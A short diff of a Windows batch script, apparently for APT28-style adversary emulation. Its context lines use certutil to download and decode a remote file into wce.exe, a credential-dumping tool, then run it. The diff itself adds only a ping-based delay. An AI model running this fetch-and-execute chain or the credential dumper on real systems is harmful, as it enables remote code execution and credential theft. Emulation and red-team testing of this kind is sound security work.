@@ -11,4 +11,5 @@ ECHO -------------------------------------------------------------------
 certutil.exe -urlcache -split -f https://raw.githubusercontent.com/greycel/poc/master/wce.txt %temp%\APT28\wce.txt
 certutil.exe -decode %temp%\APT28\wce.txt %temp%\APT28\wce.exe
 %temp%\APT28\wce.exe >> %temp%\APT28\pi.log
+ping 127.0.0.1 -n 4 > nul
 ECHO.
